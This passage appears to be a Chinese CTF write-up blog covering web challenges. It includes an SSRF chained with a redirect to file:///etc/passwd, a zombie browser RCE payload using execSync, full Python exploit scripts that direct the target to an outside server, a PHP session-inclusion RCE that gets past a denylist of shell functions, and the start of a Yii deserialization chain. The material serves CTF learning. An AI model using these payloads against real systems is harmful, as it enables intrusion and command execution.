class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/profile&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; affiliation, age, bucket &#125; = req.body;</span><br><span class="line">    <span class="keyword">const</span> user = <span class="keyword">await</span> User.findByPk(req.session.userId);</span><br><span class="line">    <span class="keyword">if</span> (!affiliation || !age || !bucket || <span class="keyword">typeof</span> (age) !== <span class="string">&quot;string&quot;</span> || <span class="keyword">typeof</span> (bucket) !== <span class="string">&quot;string&quot;</span> || <span class="keyword">typeof</span> (affiliation) != <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.render(<span class="string">&#x27;user&#x27;</span>, &#123; user, <span class="attr">error</span>: <span class="string">&quot;Parameters error or blank.&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!utils.checkBucket(bucket)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.render(<span class="string">&#x27;user&#x27;</span>, &#123; user, <span class="attr">error</span>: <span class="string">&quot;Invalid bucket url.&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> authToken;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> User.update(&#123;</span><br><span class="line">            affiliation,</span><br><span class="line">            age,</span><br><span class="line">            personalBucket: bucket</span><br><span class="line">        &#125;, &#123;</span><br><span class="line">            where: &#123; <span class="attr">userId</span>: req.session.userId &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">const</span> token = crypto.randomBytes(<span class="number">32</span>).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">        authToken = token;</span><br><span class="line">        <span class="keyword">await</span> Token.create(&#123; <span class="attr">userId</span>: req.session.userId, token, <span class="attr">valid</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">        <span class="keyword">await</span> Token.update(&#123;</span><br><span class="line">            valid: <span class="literal">false</span>,</span><br><span class="line">        &#125;, &#123;</span><br><span class="line">            where: &#123;</span><br><span class="line">                userId: req.session.userId,</span><br><span class="line">                token: &#123; [Op.not]: authToken &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        next(createError(<span class="number">500</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^https:\/\/[a-f0-9]&#123;32&#125;\.oss-cn-beijing\.ichunqiu\.com\/$/</span>.exec(bucket)) &#123;</span><br><span class="line">        res.redirect(<span class="string">`/user/verify?token=<span class="subst">$&#123;authToken&#125;</span>`</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Well, admin won&#x27;t do that actually XD. </span></span><br><span class="line">        <span class="keyword">return</span> res.render(<span class="string">&#x27;user&#x27;</span>, &#123; <span class="attr">user</span>: user, <span class="attr">message</span>: <span class="string">&quot;Admin will check if your bucket is qualified later.&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/verify&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; token &#125; = req.query;</span><br><span class="line">    <span class="keyword">if</span> (!token || <span class="keyword">typeof</span> (token) !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(<span class="string">&quot;Parameters error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> user = <span class="keyword">await</span> User.findByPk(req.session.userId);</span><br><span class="line">    <span class="keyword">const</span> result = <span class="keyword">await</span> Token.findOne(&#123;</span><br><span class="line">        token,</span><br><span class="line">        userId: req.session.userId,</span><br><span class="line">        valid: <span class="literal">true</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">if</span> (result) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> Token.update(&#123;</span><br><span class="line">                valid: <span class="literal">false</span></span><br><span class="line">            &#125;, &#123;</span><br><span class="line">                where: &#123; <span class="attr">userId</span>: req.session.userId &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">await</span> User.update(&#123;</span><br><span class="line">                bucket: user.personalBucket</span><br><span class="line">            &#125;, &#123;</span><br><span class="line">                where: &#123; <span class="attr">userId</span>: req.session.userId &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            user = <span class="keyword">await</span> User.findByPk(req.session.userId);</span><br><span class="line">            <span class="keyword">return</span> res.render(<span class="string">&#x27;user&#x27;</span>, &#123; user, <span class="attr">message</span>: <span class="string">&quot;Successfully update your bucket from personal bucket!&quot;</span> &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            next(createError(<span class="number">500</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        user = <span class="keyword">await</span> User.findByPk(req.session.userId);</span><br><span class="line">        <span class="keyword">return</span> res.render(<span class="string">&#x27;user&#x27;</span>, &#123; user, <span class="attr">message</span>: <span class="string">&quot;Failed to update, check your token carefully&quot;</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Not implemented yet</span></span><br><span class="line">router.get(<span class="string">&#x27;/bucket&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> user = <span class="keyword">await</span> User.findByPk(req.session.userId);</span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^https:\/\/[a-f0-9]&#123;32&#125;\.oss-cn-beijing\.ichunqiu\.com\/$/</span>.exec(user.bucket)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.json(&#123; <span class="attr">message</span>: <span class="string">&quot;Sorry but our remote oss server is under maintenance&quot;</span> &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Should be a private site for Admin</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> page = <span class="keyword">new</span> Crawler(&#123;</span><br><span class="line">                userAgent: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36&#x27;</span>,</span><br><span class="line">                referrer: <span class="string">&#x27;https://www.ichunqiu.com/&#x27;</span>,</span><br><span class="line">                waitDuration: <span class="string">&#x27;3s&#x27;</span></span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">await</span> page.goto(user.bucket);</span><br><span class="line">            <span class="keyword">const</span> html = page.htmlContent;</span><br><span class="line">            <span class="keyword">const</span> headers = page.headers;</span><br><span class="line">            <span class="keyword">const</span> cookies = page.cookies;</span><br><span class="line">            <span class="keyword">await</span> page.close();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> res.json(&#123; html, headers, cookies&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.json(&#123; <span class="attr">err</span>: <span class="string">&#x27;Error visiting your bucket. &#x27;</span> &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>可以发现每 POST 请求一次 /profile 都会向数据库中写入一个 token，而只有在所提交的链接合乎正则的时候才会返回给用户。关键就在于即使不返回给用户，token 也不会从数据库中被删除。而 verify 在验证时仅仅判断了库中有无与用户提交的 token 相符合的有效 token，并不在意是否为当此提交。因此只需要先正常请求一次，拿到一个有效的 token，再用恶意链接重新请求更新，之后使用有效的 token 直接请求 verify 即可将恶意链接更新进 bucket。</p><p>鉴于 /profile 对所提交的链接进行了如下筛选，恶意链接还需要特别构造。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="function"><span class="title">checkBucket</span>(<span class="params">url</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        url = <span class="keyword">new</span> URL(url);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (url.protocol != <span class="string">&quot;http:&quot;</span> &amp;&amp; url.protocol != <span class="string">&quot;https:&quot;</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (url.href.includes(<span class="string">&#x27;oss-cn-beijing.ichunqiu.com&#x27;</span>) === <span class="literal">false</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处限定了链接所使用的协议，但是并没有限制跳转，因此可以借助服务器进行 302 跳转。在服务器中写如下代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> header(<span class="string">&quot;Location: file///etc/passwd&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>同时恶意链接写作 <code>http://8.136.8.210:10025#oss-cn-beijing.ichunqiu.com</code> 即可成功绕过此处的处理，进而 SSRF。结合题目描述和使用 file 协议读到的 /readflag 文件可知需要执行 /readflag 来获取 flag。</p><h4 id="Zombie-Package-Code-Injection"><a href="#Zombie-Package-Code-Injection" class="headerlink" title="Zombie Package Code Injection"></a>Zombie Package Code Injection</h4><blockquote><p><a href="https://ha.cker.in/index.php/Article/13563">https://ha.cker.in/index.php/Article/13563</a></p></blockquote><p>很容易发现程序使用了 zombie 来完成对我们提交的 bucket 的访问，因此我们只需要在页面中写入 RCE 的代码即可。构造出如下载荷来获取 flag。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="built_in">this</span>[<span class="string">&quot;constructor&quot;</span>][<span class="string">&quot;constructor&quot;</span>](<span class="string">&quot;return(global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;/readflag&#x27;).toString())&quot;</span>)());</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配合如下脚本完成 SSRF。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx <span class="keyword">as</span> requests</span><br><span class="line">session = requests.Client(</span><br><span class="line">    base_url=<span class="string">&quot;http://eci-2ze4wxo32t273t3wq2e7.cloudeci1.ichunqiu.com:8888&quot;</span></span><br><span class="line">)</span><br><span class="line">TOKEN = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FetchToken</span>():</span></span><br><span class="line">    <span class="keyword">global</span> TOKEN</span><br><span class="line"></span><br><span class="line">    response = session.post(<span class="string">&quot;/user/profile&quot;</span>, data=&#123;</span><br><span class="line">        <span class="string">&quot;bucket&quot;</span>:<span class="string">f&quot;https://00000000000000000000000000000000.oss-cn-beijing.ichunqiu.com/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;affiliation&quot;</span>:<span class="string">&quot;20&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span>:<span class="string">&quot;20&quot;</span></span><br><span class="line">    &#125;, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    TOKEN = response.content.decode()[<span class="number">41</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Fetched Token <span class="subst">&#123;TOKEN&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Prepare</span>():</span></span><br><span class="line">    <span class="comment"># Sign Up</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = session.post(<span class="string">&quot;/signup&quot;</span>, data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;LemonPass&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password_confirm&quot;</span>: <span class="string">&quot;LemonPass&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> response.status_code == <span class="number">200</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Sign Up done&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Sign In</span></span><br><span class="line">    response = session.post(<span class="string">&quot;/signin&quot;</span>, data=&#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;LemonPass&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> response.status_code == <span class="number">200</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Sign In done&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exploit</span>(<span class="params">bucket</span>):</span></span><br><span class="line">    <span class="keyword">global</span> TOKEN</span><br><span class="line">    response = session.post(<span class="string">&quot;/user/profile&quot;</span>, data=&#123;</span><br><span class="line">        <span class="string">&quot;bucket&quot;</span>:<span class="string">f&quot;http://<span class="subst">&#123;bucket&#125;</span>/\x23oss-cn-beijing.ichunqiu.com/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;affiliation&quot;</span>:<span class="string">&quot;20&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span>:<span class="string">&quot;20&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">assert</span> response.status_code == <span class="number">200</span></span><br><span class="line"></span><br><span class="line">    response = session.get(<span class="string">&quot;/user/verify&quot;</span>, params=&#123;</span><br><span class="line">        <span class="string">&quot;token&quot;</span>: TOKEN</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">assert</span> response.status_code == <span class="number">200</span></span><br><span class="line"></span><br><span class="line">    response = session.get(<span class="string">&quot;/user/bucket&quot;</span>)</span><br><span class="line">    <span class="keyword">assert</span> response.status_code == <span class="number">200</span></span><br><span class="line">    <span class="keyword">return</span> response.content.decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Prepare()</span><br><span class="line">FetchToken()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Exploit(<span class="string">&quot;8.136.8.210:10025&quot;</span>))</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/20edba28-0183-47bf-b9a7-a7fef30e4caa/1629628486321301/4bbfff035ec86ff8a82132b364f7dc501e6bc0be.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e96b6eee-f95d-4e72-a839-fa9552465b24&#125;</span><br></pre></td></tr></table></figure><h3 id="安全检测"><a href="#安全检测" class="headerlink" title="安全检测"></a>安全检测</h3><blockquote><p>某安全监测平台。</p></blockquote><p>给出了一个网站检测的业务，尝试 <code>http://127.0.0.1/admin</code> 可以发现有一个 include123.php 文件。使用同样的套路可以读取到如下源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;\/\*|\*|\.\.\/|\.\/|load_file|outfile|dumpfile|sub|hex|where&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .= <span class="string">&quot;|file_put_content|file_get_content|fwrite|curl|system|eval|assert&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .=<span class="string">&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .=<span class="string">&quot;|`|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec|http|.php|.ph|.log|\@|:\/\/|flag|access|error|stdout|stderr&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .=<span class="string">&quot;|file|dict|gopher&quot;</span>;</span><br><span class="line"><span class="comment">//累了累了，饮茶先</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$vpattern</span> = explode(<span class="string">&quot;|&quot;</span>,<span class="variable">$pattern</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$vpattern</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;    </span><br><span class="line">    <span class="keyword">if</span> (preg_match( <span class="string">&quot;/<span class="subst">$value</span>/i&quot;</span>, <span class="variable">$u</span> ))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;检测到恶意字符&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$u</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以发现这里存在一个文件包含，而因为有大量的 ban 掉的函数导致了很难直接 RCE 或者进行文件读取。</p><h4 id="PHP-SESSION-包含"><a href="#PHP-SESSION-包含" class="headerlink" title="PHP SESSION 包含"></a>PHP SESSION 包含</h4><p>因为程序使用到了 session，假使 session.use_strict_mode 为 0 则可以包含到 /tmp 目录下被序列化存储的 session。写个脚本来一把梭达成 RCE 并拿到 flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx <span class="keyword">as</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Client(base_url=<span class="string">&quot;http://eci-2zehr586mkdtes1jcaj6.cloudeci1.ichunqiu.com&quot;</span>)</span><br><span class="line">session.cookies.<span class="built_in">set</span>(<span class="string">&quot;PHPSESSID&quot;</span>, <span class="string">&quot;Lemon&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exploit</span>(<span class="params">payload</span>):</span></span><br><span class="line">    <span class="comment"># response = session.post(&quot;/login.php&quot;, data=&#123;</span></span><br><span class="line">    <span class="comment">#     &quot;username&quot;:&quot;a&quot;,</span></span><br><span class="line">    <span class="comment">#     &quot;password&quot;:&quot;b&quot;</span></span><br><span class="line">    <span class="comment"># &#125;)</span></span><br><span class="line"></span><br><span class="line">    response = session.post(<span class="string">&quot;/check2.php&quot;</span>, data=&#123;</span><br><span class="line">        <span class="string">&quot;url1&quot;</span>: <span class="string">f&quot;http://baidu.com/<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line">    &#125;, files=[</span><br><span class="line">        (<span class="string">&#x27;file&#x27;</span>, (<span class="string">&#x27;1.png&#x27;</span>, <span class="string">&quot;\x89PNG\r\n&quot;</span>, <span class="string">&#x27;application/png&#x27;</span>))</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    session.cookies.<span class="built_in">set</span>(<span class="string">&quot;PHPSESSID&quot;</span>, <span class="string">&quot;Lemon2&quot;</span>)</span><br><span class="line">    response = session.post(<span class="string">&quot;/check2.php&quot;</span>, data=&#123;</span><br><span class="line">        <span class="comment"># &quot;url1&quot;: &quot;http://127.0.0.1/admin/include123.php?u=/tmp/sess_Lemon&quot;</span></span><br><span class="line">        <span class="string">&quot;url1&quot;</span>: <span class="string">&quot;http://127.0.0.1/admin/include123.php?u=/tmp/flaaaaaag.txt&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    response = session.get(<span class="string">&quot;/preview.php&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.content.decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit(&quot;&lt;?=phpinfo();?&gt;&quot;) # PHPINFO</span></span><br><span class="line"><span class="comment"># Exploit(&quot;&lt;?=var_dump(scandir(\&quot;/\&quot;));?&gt;&quot;) # Root Directory</span></span><br><span class="line"><span class="comment"># Exploit(&quot;&lt;?=system(\&quot;/g??????.sh&gt;/tmp/flaaaaaag.txt\&quot;);?&gt;&quot;) # Extract flag</span></span><br><span class="line">Exploit(<span class="string">&quot;&quot;</span>) <span class="comment"># Extract flag</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6a6fc984-0393-4a56-8ce1-8ea011d9d165&#125;</span><br></pre></td></tr></table></figure><h3 id="ezyii"><a href="#ezyii" class="headerlink" title="ezyii"></a>ezyii</h3><blockquote><p>yii最新版里有一个很巧妙的链子，我已经从999999个文件里，拿出了部分，不会还找不到吧？</p></blockquote><p>这波是快照里有原本的链子。</p><blockquote><p><a href="https://webcache.googleusercontent.com/search?q=cache:QjwZwIOglLAJ:https://github.com/JinYiTong/poc">https://webcache.googleusercontent.com/search?q=cache:QjwZwIOglLAJ:https://github.com/JinYiTong/poc</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>\<span class="title">AppendStream</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span>  <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$output</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processes</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes[]=<span class="keyword">new</span> DefaultGenerator(<span class="keyword">new</span> AppendStream());</span><br><span class="line">            <span 